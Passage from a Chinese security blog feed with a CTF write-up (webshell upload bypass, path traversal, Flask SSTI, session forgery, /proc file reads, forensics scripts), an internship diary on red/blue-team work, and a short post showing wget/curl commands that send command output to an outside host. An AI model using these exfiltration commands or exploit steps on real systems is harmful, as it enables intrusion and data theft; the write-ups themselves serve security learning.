    <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>webshell上传</p><p>前端绕过。绕了半天才想起来是前端绕过。。burp改个后缀就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">代码</span><br><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到shell 蚁剑上传 cat /flag</p><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p><a href="http://172.20.2.4:9003/index.php?txt=../../../flag">http://172.20.2.4:9003/index.php?txt=../../../flag</a> 任意文件读取，秒了</p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p>知识点：SSTI,SSTI读配置文件，/proc目录的作用，flask session伪造</p><p>首先，尝试登录172.20.2.3:9006,登录失败，访问了一下robots.txt,发现了有报错信息，观察URL，考虑可能存在XSS，</p><p>image-20210511155722690.png<img src="http://cdn.polowong.top/1620813539140l7b6j4e6.png?imageslim" alt="paste image"><br>这里看了一眼中间件分析结果，发现了flask。。flask人狂喜（。</p><p>直接4</p><p>image-20210511155809022.png<img src="http://cdn.polowong.top/1620813548564ty2uanbr.png?imageslim" alt="paste image"><br>懂得都懂，铁ssti了，尝试一步步rce，检测发现没开debug模式，所以只能走常规的rce利用了。</p><p>当尝试到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()</span><br></pre></td></tr></table></figure><p>时发现被ban了，单独测试了下小括号，发现是ban了小括号。既然ban了小括号，那么常规的ssti rce基本就走不通了。只能考虑读取一些敏感文件，比如config，使用payload  读取config文件，发现了 secret_key</p><p>image-20210511160014837.png<img src="http://cdn.polowong.top/16208135773438gjedayy.png?imageslim" alt="paste image"></p><p>secret_key的作用是生成session，具体步骤我忘了，反正是根据secret_key可以还原和生成对应的session。</p><p>github有对应的工具，flask session manager。</p><p>接下来看了看源码，<br>image-20210511160246157.png<img src="http://cdn.polowong.top/1620813563588zor9il2b.png?imageslim" alt="paste image"></p><p>一个简单的前端验证，burp抓返回包把0改成1就行，这样就顺利进入后台了。但是进入后台后提示我不是admin（2333</p><p>image-20210511160330889.png<img src="http://cdn.polowong.top/16208136016557e3ok72r.png?imageslim" alt="paste image"></p><p>好吧，看起来是要伪造admin的session了。现在secret_key有了，用工具先解密当前session，把用户名改成admin后再生成session。如下图所示</p><p>image-20210511160731351.png<img src="http://cdn.polowong.top/1620813610364ajp4gund.png?imageslim" alt="paste image"></p><p>那么当前生成的admin的session就是eyJ1c2VybmFtZSI6ImFkbWluIn0.YJo7Og.7WfYqubO5M7KZ-8IXXKIp6kMf5o，edit this cookie 换一下（我这chrome有bug，用的firefox）</p><p>image-20210511160841881.png<img src="http://cdn.polowong.top/16208136158740qcqf1gf.png?imageslim" alt="paste image"></p><p>已经给了hint，考虑任意文件读取，首先尝试读取/etc/passwd，成功。</p><p>image-20210511161046827.png<img src="http://cdn.polowong.top/16208136213232flk4by2.png?imageslim" alt="paste image"></p><p>接下来尝试读flag。直接/flag不行，关键字给过滤了。卡了好几个小时</p><p>用了挺多绕过方法 /fla? /f* 等等 但是可能中间有转义之类的，最终传到Linux层并不能识别通配符，所以卡了很长时间</p><p>最后的思路是之前比赛中读flag，过滤了很多，师傅告诉我利用/proc/目录读文件，proc目录代表了与当前运行进程有关的信息并以文件的形式展示（学习链接：<a href="https://blog.csdn.net/qq_45521281/article/details/114594402%EF%BC%89%EF%BC%8C%E8%80%8C/proc/self%E7%9B%AE%E5%BD%95%E4%BB%A3%E8%A1%A8%E4%BA%86%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%9C%89%E5%85%B3%E4%BF%A1%E6%81%AF%E5%B9%B6%E4%BB%A5%E6%96%87%E4%BB%B6%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%B1%95%E7%A4%BA%EF%BC%8C%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E6%9C%89fd%E3%80%81cmdline%E3%80%81cwd%E3%80%81envrion%E7%AD%89%E3%80%82">https://blog.csdn.net/qq_45521281/article/details/114594402），而/proc/self目录代表了当前进程的有关信息并以文件的形式展示，需要注意的有fd、cmdline、cwd、envrion等。</a></p><p>/proc/self/cmdline 代表当前的命令行输入内容，我读取了之后是这个</p><p>image-20210511161330178.png<img src="http://cdn.polowong.top/1620813626597i04733zp.png?imageslim" alt="paste image"></p><p>好家伙 绝对路径有了，直接读文件</p><p>/app/app_a384gh1.py</p><p>程序代码如下，基本修复了ssti-&gt;rce，然后看到了import  ffffffff111llllag 文件，那直接读当前/app目录下的ffffffff111llllag.py就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string,redirect,render_template,session</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ffffffff111llllag</span><br><span class="line"></span><br><span class="line">app = Flask(import_name=__name__,template_folder=<span class="string">&#x27;templates&#x27;</span>,static_folder=<span class="string">&#x27;static&#x27;</span>,static_url_path=<span class="string">&#x27;/static&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] =<span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;/admin/&#x27;</span> <span class="keyword">in</span> request.path:</span><br><span class="line">        sess_name=<span class="string">&#x27;guest&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(session)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">            sess_name=session[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> sess_name!=<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your current account is &#x27;</span>+sess_name+<span class="string">&#x27; not admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeheader</span>(<span class="params">response</span>):</span></span><br><span class="line">    response.headers[<span class="string">&quot;X-Powered-By&quot;</span>] = <span class="string">&quot;PHP/7.2.10&quot;</span></span><br><span class="line">    response.headers[<span class="string">&quot;Hint&quot;</span>] = <span class="string">&quot;Wake up Neo, the Matrix has you&quot;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Server&#x27;</span>]=<span class="string">&#x27;Apache/2.4.35 (Win64) PHP/7.2.10&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redirect_2_index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;not in session!&#x27;</span>)</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;./index.php&quot;</span>, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/err.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">err</span>():</span></span><br><span class="line">    <span class="comment">#I patched the SSTI vulnerability.How clever I am!</span></span><br><span class="line">    errorinfo=request.args.get(<span class="string">&quot;errorinfo&quot;</span>)</span><br><span class="line">    blacklist=[<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> errorinfo:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You&#x27;re just a dirty hacker,aren&#x27;t you?&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;Oh no,there is an Error! Error info:&lt;p&gt; %s&quot;</span> % errorinfo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login.php&quot;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> username <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> password:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin/backendmanage.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backendmanage</span>():</span></span><br><span class="line">    img=request.args.get(<span class="string">&quot;img&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> img:</span><br><span class="line">        img=<span class="string">&#x27;1.png&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> img:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You&#x27;re just a dirty hacker,aren&#x27;t you?&quot;</span></span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(img, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> img_f:</span><br><span class="line">        content = img_f.read()</span><br><span class="line">        content = base64.b64encode(content)</span><br><span class="line">    content=<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> content])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;Current Image:&#123;img&#125;&lt;/h1&gt;&lt;!-- ?img=1.png --&gt;&lt;img  src=&quot;data:;base64,&#123;content&#125;&quot;&gt;&#x27;</span>.<span class="built_in">format</span>(img=img,content=content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params">Exception</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all_exception_handler</span>(<span class="params">e</span>):</span></span><br><span class="line">    e=<span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/err.php?errorinfo=&quot;</span>+e, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>读取flag文件后，拿到flag。</p><p>image-20210511161628308.png<img src="http://cdn.polowong.top/1620813641263aqv49hf6.png?imageslim" alt="paste image"></p><p>这题有几个坑点，首先是HTTP头里面的PHP HEADER 容易迷惑人，其次是登录那的sql注入容易迷惑人，最后是FLASK-SSTI的利用方式需要掌握全面：</p><p>1.直接RCE</p><p>2.开DEBUG时，SSTI 读文件-&gt;构造PIN码-&gt;RCE</p><p>3.伪造session登录</p><h1 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h1><p>流量包没看出来啥，直接分离http对象发现了flag.php，压缩包被破坏了，修复下头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，                        　　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　</span><br><span class="line">PNG (png)，                       　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82</span><br><span class="line">GIF (gif)，                           　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                                                 ZIP Archive (zip)，                     文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4B</span><br><span class="line"></span><br><span class="line">TIFF (tif)，                           　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：</span><br><span class="line">Windows Bitmap (bmp)，      　  文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：</span><br><span class="line">CAD (dwg)，                        　  文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：</span><br><span class="line">Adobe Photoshop (psd)，          文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：</span><br><span class="line">Rich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：</span><br><span class="line">XML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：</span><br><span class="line">HTML (html)，                           文件头：68746D6C3E</span><br><span class="line">Email [thorough only] (eml)，     文件头：44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)，            文件头：CFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)，                         文件头：2142444E</span><br><span class="line">MS Word&#x2F;Excel (xls.or.doc)，      文件头：D0CF11E0</span><br><span class="line">MS Access (mdb)，                    文件头：5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)，                  文件头：FF575043</span><br><span class="line">Adobe Acrobat (pdf)，               文件头：255044462D312E</span><br><span class="line">Quicken (qdf)，                         文件头：AC9EBD8F</span><br><span class="line">Windows Password (pwl)，         文件头：E3828596</span><br><span class="line"></span><br><span class="line">RAR Archive (rar)，                    文件头：52617221</span><br><span class="line">Wave (wav)，                            文件头：57415645</span><br><span class="line">AVI (avi)，                                 文件头：41564920</span><br><span class="line">Real Audio (ram)，                     文件头：2E7261FD</span><br><span class="line">Real Media (rm)，                       文件头：2E524D46</span><br><span class="line">MPEG (mpg)，                           文件头：000001BA</span><br><span class="line">MPEG (mpg)，                           文件头：000001B3</span><br><span class="line">Quicktime (mov)，                     文件头：6D6F6F76</span><br><span class="line">Windows Media (asf)，               文件头：3026B2758E66CF11</span><br><span class="line">MIDI (mid)，                              文件头：4D546864</span><br></pre></td></tr></table></figure><p>image-20210512132636816.png<img src="http://cdn.polowong.top/1620813669182k7qlq11e.png?imageslim" alt="paste image"></p><p>提取rar</p><p>image-20210512132807911.png<img src="http://cdn.polowong.top/16208136734786pvpwoic.png?imageslim" alt="paste image"></p><p>十六进制转ascii</p><p>flag{My_Name_is_AoBai}</p><h1 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h1><p>zip文件头修复</p><p>得到密文5a6e4665536e506248206579666b7b39733930733833742d393637312d3433626a2d616f69302d3235663176393138707030377d</p><p>十六进制转ascii</p><p>ZnFeSnPbH<br>eyfk{9s90s83t-9671-43bj-aoi0-25f1v918pp07}</p><p>维吉尼亚解密（captfencoder1.x版本 维吉尼亚解密有bug）</p><p>flag{9a90f83e-9671-43ac-bbd0-25b1d918ca07}</p><h1 id="misc-3"><a href="#misc-3" class="headerlink" title="misc 3"></a>misc 3</h1><p>压缩包头部修复，修改错了的1位</p><p>然后需要密码，直接binwalk分离出来一个Linux可执行文件，到这里卡住了。。然后后面看了看文件头应该是个png，zhiweilai加上png的为文件头后发现图片宽高有问题，Linux打不开，用脚本爆破宽高修改即可。</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    crc32key = <span class="built_in">int</span>(all_b[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    data = <span class="built_in">bytearray</span>(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span>            <span class="comment">#理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):          <span class="comment">#高和宽一起爆破</span></span><br><span class="line">        width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))     <span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;宽为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                width1=binascii.b2a_hex(width)</span><br><span class="line">                width1=width1.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                width1=<span class="built_in">int</span>(width1,<span class="number">16</span>)</span><br><span class="line">                <span class="built_in">print</span>(width,width1)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;高为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                height1=binascii.b2a_hex(height)</span><br><span class="line">                height1=height1.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                height1=<span class="built_in">int</span>(height1,<span class="number">16</span>)</span><br><span class="line">                <span class="built_in">print</span>(height,height1)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>在对应的位置修改图片宽高的十六进制值即可。</p><p>image-20210512175308222.png<img src="http://cdn.polowong.top/16208136581593aoz2hnd.png?imageslim" alt="paste image"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web1&quot;&gt;&lt;a href=&quot;#web1&quot; class=&quot;headerlink&quot; title=&quot;web1&quot;&gt;&lt;/a&gt;web1&lt;/h1&gt;&lt;p&gt;webshell上传&lt;/p&gt;
&lt;p&gt;前端绕过。绕了半天才想起来是前端绕过。。burp改个后缀就好了&lt;/p&gt;
&lt;figure </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>实习&amp;季度总结</title>
    <link href="https://polosec.github.io/2021/04/23/%E5%AE%9E%E4%B9%A0-%E5%AD%A3%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://polosec.github.io/2021/04/23/%E5%AE%9E%E4%B9%A0-%E5%AD%A3%E5%BA%A6%E6%80%BB%E7%BB%93/</id>
    <published>2021-04-23T07:17:00.000Z</published>
    <updated>2021-04-30T03:43:43.747Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>今天是2021年4月29日，刚结束某市hw项目，做完这个项目，我的实习生活基本算是结束了。还在高铁上，趁着这个时间总结下这四个月的实习&amp;项目生活。</p></blockquote><h2 id="金山云实习"><a href="#金山云实习" class="headerlink" title="金山云实习"></a>金山云实习</h2><p>今年一月份，开始了在金山云实习的日子，总计约三个月，其实干活的时间也就四十来天，中间算上过年、请假什么的，所以日子就比较少了。和同事们的相处很愉快，领导是搞技术的，相处起来非常舒服。在金山的这段时间还算是比较快乐的，虽然累了一点，但是收获相对还不错。在金山，首先是在做项目的过程中学到了一些知识，渗透的思路、测试方法啥的，我觉得这些比较重要，其次是在公司钓鱼的项目中学到了红队知识，并且开启了我对红队向往的大门。<br>在公司，我学到了一些简单的免杀技巧，并且还会继续钻研；接触到了钓鱼邮件伪造，目前还在学习；Badusb上线CS马，这个已经实现了。还有就是基本的应急响应技能，在公司我独立处理了一起应急响应事件，我觉得真的是很棒的实践机会。最后是社交方面，认识了一些朋友。其他虚无缥缈的不说了，只说些实际的。</p><h2 id="hw蓝队"><a href="#hw蓝队" class="headerlink" title="hw蓝队"></a>hw蓝队</h2><p>今年hw去了青藤，本来签了深蓝，深蓝的负责人对我也很好，但是后面出了点事情，所以我就给鸽了…不管怎么说，感谢硕哥给我机会，弟弟铭记在心。说实在的，hw我是夜班，主要是看HIDS设备告警，被地方的给搞烦了，经常有误报，白天的同时也很辛苦，我觉得我夜班还是非常幸运的，就是身体上累了点。我觉得 通过这次hw 认识朋友比较重要吧，其次就是真真正正地接触了一下这种大型的安全项目，之前并没有接触过。还有就是在hw时的一些处理事情的方法，比如处置流程、权限与职责。之类的之前也只是限于理论，也更加了解了我想象中的hw和真实的hw的区别2333.</p><h2 id="hw红队"><a href="#hw红队" class="headerlink" title="hw红队"></a>hw红队</h2><p>最后打了一次县市级的hw红队，其实还是挺丢人的，我自己知道自己水平不行，但是还是想去试试。虽然朋友跟我讲了是无责的，但是打了那么烂的成绩，自己心里真的不好受。。相比于拿到工资，更多的是自责吧。当然了，在这次的红队之旅中也学到了一些东西。首先是自己的渗透思路问题，渗透思路首先是不清晰，其次是太窄。信息收集时经常有遗漏或者对这个站做了某方法的收集，到了下个站就忘了或者不想做了。。这个毛病不知道什么时候能改掉。其次是漏洞的原理掌握的不够好和漏洞类型掌握的不够多，绕waf等操作需要较强的基础性知识。就像ssti绕过一样~不管怎么说，红队来了这一趟我个人是不亏的，但是对不起朋友了。</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>希望下次看到这篇博客，能对比写时有些进步。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;今天是2021年4月29日，刚结束某市hw项目，做完这个项目，我的实习生活基本算是结束了。还在高铁上，趁着这个时间总结下这四个月的实习&amp;amp;项目生活。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;金山云实习&quot;&gt;&lt;a href=&quot;#金山云</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>命令执行结果外带</title>
    <link href="https://polosec.github.io/2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/"/>
    <id>https://polosec.github.io/2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/</id>
    <published>2021-04-17T18:25:55.000Z</published>
    <updated>2021-04-17T21:37:56.341Z</updated>
    
    <content type="html"><![CDATA[<p>wget –header=”test:$(whoami)” <a href="http://ssti.com:5000/?username%5C=1">http://ssti.com:5000\?username\=1</a></p><img src="http://cdn.polowong.top/static/images/wget1.png"><p>whoami | curl -F “:data=@-“ <a href="http://ssti.com:5000/?username%5C=1">http://ssti.com:5000\?username\=1</a>  </p><img src="http://cdn.polowong.top/static/images/curl1.png"><p>Curl “<a href="http://ssti.com:5000/?username=&#96;whoami&#96;&quot;">http://ssti.com:5000?username=&#96;whoami&#96;&quot;</a></p><img src="http://cdn.polowong.top/static/images/curl2.png">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;wget –header=”test:$(whoami)” &lt;a href=&quot;http://ssti.com:5000/?username%5C=1&quot;&gt;http://ssti.com:5000\?username\=1&lt;/a&gt;&lt;/p&gt;
&lt;img src=&quot;http://cd</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>badusb踩坑&amp;近期感想</title>
